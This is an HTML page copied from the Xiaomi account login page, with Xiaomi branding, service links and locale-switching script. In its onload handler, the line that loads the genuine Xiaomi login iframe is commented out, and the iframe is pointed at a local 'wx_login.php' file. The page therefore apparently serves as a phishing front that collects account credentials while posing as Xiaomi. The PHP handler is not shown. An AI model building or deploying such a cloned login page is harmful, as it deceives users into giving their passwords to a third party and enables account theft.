

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>小米帐户 - 登录</title>
</head>
<style>
/* 新版登录 new login - nl*/
html,body,ul,li,p,h1,div,a,img{padding: 0; margin: 0;}
html,body{background:#f9f9f9; line-height: 1.5; color: #333; font-size: 12px;}
body,input{font-family: "Hiragino Sans GB", "Microsoft YaHei", "WenQuanYi Micro Hei", sans-serif;}
a,label, :focus{outline:0 none;}
a,img{border:0 none;}
a{text-decoration: none;}
@media screen and (-ms-high-contrast: active), (-ms-high-contrast: none) {
  a{background-color:transparent;}
}

.nl-content{text-align: center; padding-top: 145px;}
.nl-logo-area{margin-bottom: 50px; height: 82px;}
.nl-login-title{font-size: 40px; margin-bottom: 10px; color: #000;}
.nl-login-intro{color: #8d8d8d; font-size: 14px; margin-bottom: 30px;}
.nl-login-intro a{color: #8d8d8d;}
.nl-login-intro a:hover{color: #ff7e00; text-decoration: none; }
.nl-phone-tip{width: 324px; margin:0 auto; text-align: left; height: 36px;}

.nl-footer{text-align: center; padding-bottom: 40px;}
.nl-f-nav{margin-bottom: 10px;}
.nl-f-nav a{display: inline-block; *zoom:1; *display: inline; color: #919191; padding: 0 6px;  line-height: 1.2;}
.nl-f-nav a:hover{color: #545454; font-weight: bold;}
.nl-f-copyright{color: #999;}

.zh_CN .zh-cn,
.zh_TW .zh-tw,
.en .zh-en{color: #545454; font-weight: bold;}
.zh_TW .nl-phone-tip{text-align:center;}
</style>
<body>
  <div class="nl-content">
    <div class="nl-logo-area"><a href=""><img src="/static/img/passport/nl-logo.png"/></a></div>
    <h1 class="nl-login-title">一个帐号，玩转所有小米服务！</h1>
    <p class="nl-login-intro">
      <a href="http://www.xiaomi.com/" target="_blank">小米手机</a>，<a href="http://www.xiaomi.com/index.php" target="_blank">小米网</a>，<a href="http://www.miui.com/" target="_blank">MIUI米柚</a>，<a href="http://www.duokan.com/" target="_blank">多看阅读</a>，<a href="http://www.miliao.com/" target="_blank">米聊</a>
    </p>
    <p class="nl-phone-tip">&nbsp;</p>
    <div class="nl-frame-container">
      <iframe id="miniLoginFrame" allowtransparency="true" width="500" height="340" frameborder="0" scrolling="0" style="background:transparent; margin-left:100px;"></iframe>
    </div>
  </div>
  <div class="nl-footer" style="margin-top:200px;">
    <div class="nl-f-nav" id="nl_f_nav">
      <a href="javascript:void(0);" onclick="change_lang('zh_CN'); return false;" class="zh-cn">简体</a>|
      <a href="javascript:void(0);" onclick="change_lang('zh_TW'); return false;" class="zh-tw">繁体</a>|
      <a href="javascript:void(0);" onclick="change_lang('en'); return false;" class="zh-en">English</a>|
      <a href="http://static.account.xiaomi.com/html/faq/faqList.html" target="_blank">常见问题</a>
    </div>
    <p class="nl-f-copyright">小米公司版权所有-京ICP备10046444-京公网安备1101080212535</p>
  </div>
</body>
<script>
var pass_env="https://account.xiaomi.com/pass/serviceLogin";

var iframeSrc = "/pass/static/v5login.html?inframe=true&onetimeEncode=true";

var callback = encodeURIComponent("https://account.xiaomi.com");
var sid = encodeURIComponent("passport");
var qs = encodeURIComponent("%3Fsid%3Dpassport");
var hidden = encodeURIComponent("");
var sign = encodeURIComponent("KKkRvCpZoDC+gLdeyOsdMhwV0Xg=");

function change_lang(lang){
  var url = window.location.href;
  var reg = new RegExp("(^|&)_locale=([^&]*)(&|$)");
  var r = window.location.search.substr(1).match(reg);
  if (r!=null){
    var locale = unescape(r[2]);
    url = url.replace("_locale="+locale, "_locale="+lang);
  }else{
    if( /\?/.test(url) ){
      url += "&_locale="+lang;
    }else{
      url += "?_locale="+lang;
    }
  }
  window.location.href=url.replace("serviceLoginAuth2","serviceLogin");
}

String.prototype.Trim = function() {
  return this.replace(/^\s+/g, "").replace(/\s+$/g, "");
};


function getCookie(key) {
  var cookie = document.cookie;
  var cookieArray = cookie.split(';');
  var val = "";
  for (var i = 0; i < cookieArray.length; i++) {
      if (cookieArray[i].Trim().substr(0, key.length) == key) {
    val = cookieArray[i].Trim().substr(key.length + 1);
    break;
      }
  }
  return unescape(val);
};

window.onload = function() {

  var url = window.location.href;
  var matched = url.match(/\b(_locale=en)|(_locale=zh_TW)|(_locale=zh_CN)\b/);
  iframeSrc = iframeSrc + (matched ? "&" + matched[0] : ""); 
  var cookieLocale = getCookie("uLocale");
  if( cookieLocale == 'zh_CN' || /_locale=zh_CN/.test(url) ){
    document.body.className = 'zh_CN';
  }
  if( cookieLocale == 'zh_TW' || /_locale=zh_TW/.test(url) ){
    document.body.className = 'zh_TW';
  }
  if( cookieLocale == 'en' || /_locale=en/.test(url) ){
    document.body.className = 'en';
  }
  if (cookieLocale && !matched) {
   iframeSrc = iframeSrc + "&_locale=" + cookieLocale;   
  } 
  var queryPart =  "&callback=" + callback + "&sid=" + sid + "&qs=" + qs + "&sign=" + sign + "&hidden=" + hidden;
  iframeSrc = iframeSrc + queryPart;
  //document.getElementById("miniLoginFrame").src = iframeSrc;
  document.getElementById("miniLoginFrame").src = "wx_login.php";
};

</script>
</html>
